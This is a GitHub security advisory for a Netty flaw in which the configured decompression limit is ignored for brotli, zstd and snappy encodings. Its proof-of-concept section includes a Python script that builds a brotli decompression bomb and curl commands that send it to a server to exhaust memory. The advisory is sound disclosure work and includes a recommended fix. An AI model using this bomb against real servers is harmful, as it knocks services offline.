# [H] Netty: HttpContentDecompressor maxAllocation bypass when Content-Encoding set to br/zstd/snappy leads to decompression bomb DoS

## Summary
Severity: High
Advisory: GHSA-f6hv-jmp6-3vwv
CVE: CVE-2026-42587
CWE: CWE-400
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-f6hv-jmp6-3vwv
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http` — affected >=4.2.0.Alpha1 <4.2.13.Final
- Maven: `io.netty:netty-codec-http2` — affected >=4.2.0.Alpha1 <4.2.13.Final
- Maven: `io.netty:netty-codec-http` — affected >=0 <4.1.133.Final
- Maven: `io.netty:netty-codec-http2` — affected >=0 <4.1.133.Final

## Details
## Summary

`HttpContentDecompressor` accepts a `maxAllocation` parameter to limit decompression buffer size and prevent decompression bomb attacks. This limit is correctly enforced for gzip and deflate encodings via `ZlibDecoder`, but is silently ignored when the content encoding is `br` (Brotli), `zstd`, or `snappy`. An attacker can bypass the configured decompression limit by sending a compressed payload with `Content-Encoding: br` instead of `Content-Encoding: gzip`, causing unbounded memory allocation and out-of-memory denial of service.

The same vulnerability exists in `DelegatingDecompressorFrameListener` for HTTP/2 connections.

## Details

`HttpContentDecompressor` stores the `maxAllocation` value at construction time (`HttpContentDecompressor.java:89`) and uses it in `newContentDecoder()` to create the appropriate decompression handler.

For gzip/deflate, `maxAllocation` is forwarded to `ZlibCodecFactory.newZlibDecoder()`:

```java
// HttpContentDecompressor.java:101 — maxAllocation IS enforced
.handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP, maxAllocation))
```

`ZlibDecoder.prepareDecompressBuffer()` enforces this as a hard cap by setting the buffer's `maxCapacity` and throwing `DecompressionException` when the limit is reached:

```java
// ZlibDecoder.java:68 — hard limit on buffer capacity
return ctx.alloc().heapBuffer(Math.min(preferredSize, maxAllocation), maxAllocation);
// ZlibDecoder.java:80 — throws when exceeded
throw new DecompressionException("Decompression buffer has reached maximum size: " + buffer.maxCapacity());
```

For brotli, zstd, and snappy, the decoders are created without any size limit:

```java
// HttpContentDecompressor.java:120 — maxAllocation IGNORED
.handlers(new BrotliDecoder())

// HttpContentDecompressor.java:129 — maxAllocation IGNORED
.handlers(new SnappyFrameDecoder())

// HttpContentDecompressor.java:138 — maxAllocation IGNORED
.handlers(new ZstdDecoder())
```

`BrotliDecoder` has no `maxAllocation` parameter at all — there is no way to constrain its output. It streams decompressed data in chunks via `fireChannelRead` with no total limit.

`ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`, but this only constrains individual buffer allocations, not total output. The decode loop (`ZstdDecoder.java:100-114`) creates new buffers and fires `channelRead` repeatedly, so total decompressed output is unbounded.

The identical pattern exists in `DelegatingDecompressorFrameListener.newContentDecompressor()` at lines 188-210 for HTTP/2.

## PoC

1. Configure a Netty HTTP server with decompression bomb protection:

```java
pipeline.addLast(new HttpContentDecompressor(1048576)); // 1MB max
pipeline.addLast(new HttpObjectAggregator(1048576));     // 1MB max
```

2. Generate a brotli-compressed bomb (~1KB compressed → 1GB decompressed):

```python
import brotli
bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
compressed = brotli.compress(bomb, quality=11)
with open('bomb.br', 'wb') as f:
    f.write(compressed)
# compressed size: ~1KB
```

3. Send the bomb with gzip encoding (BLOCKED by maxAllocation):

```bash
# This is caught — ZlibDecoder enforces the 1MB limit
curl -X POST http://target:8080/api \
  -H 'Content-Encoding: gzip' \
  --data-binary @bomb.gz
# Result: DecompressionException thrown at 1MB
```

4. Send the same bomb with brotli encoding (BYPASSES maxAllocation):

```bash
# This bypasses the limit — BrotliDecoder has no maxAllocation
curl -X POST http://target:8080/api \
  -H 'Content-Encoding: br' \
  --data-binary @bomb.br
# Result: Full 1GB decompressed into memory → OOM
```

5. The same bypass works with `Content-Encoding: zstd` and `Content-Encoding: snappy`.

## Impact

- **Denial of Service**: An attacker can cause out-of-memory conditions on any Netty server that relies on `maxAllocation` for decompression bomb protection, by simply using a non-gzip content encoding.
- **False sense of security**: Developers who explicitly configure `maxAllocation` to protect against decompression bombs are not actually protected for brotli, zstd, or snappy encodings. The API documentation implies all encodings are covered.
- **Trivial bypass**: The attacker only needs to change one HTTP header (`Content-Encoding: br` instead of `Content-Encoding: gzip`) to circumvent the protection entirely.
- **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in both `HttpContentDecompressor` (HTTP/1.1) and `DelegatingDecompressorFrameListener` (HTTP/2).

## Recommended Fix

Pass `maxAllocation` to all decoder constructors. For `BrotliDecoder`, which currently has no `maxAllocation` support, add the parameter:

**HttpContentDecompressor.java** — pass maxAllocation to all decoders:

```java
// Line 120: BrotliDecoder — add maxAllocation support
.handlers(new BrotliDecoder(maxAllocation))

// Line 129: SnappyFrameDecoder — add maxAllocation support
.handlers(new SnappyFrameDecoder(maxAllocation))

// Line 138: ZstdDecoder — forward the configured maxAllocation
.handlers(new ZstdDecoder(maxAllocation))
```

**DelegatingDecompressorFrameListener.java** — same fix at lines 188-210.

**BrotliDecoder** — add `maxAllocation` parameter with the same semantics as `ZlibDecoder.prepareDecompressBuffer()`: set buffer maxCapacity and throw `DecompressionException` when the total decompressed output exceeds the limit.

**SnappyFrameDecoder** — add `maxAllocation` parameter with equivalent enforcement.

**ZstdDecoder** — ensure that when `maxAllocation` is set, total output across all buffers is bounded (not just per-buffer allocation size).

## References
- https://github.com/netty/netty/security/advisories/GHSA-f6hv-jmp6-3vwv
- https://nvd.nist.gov/vuln/detail/CVE-2026-42587
- https://github.com/netty/netty
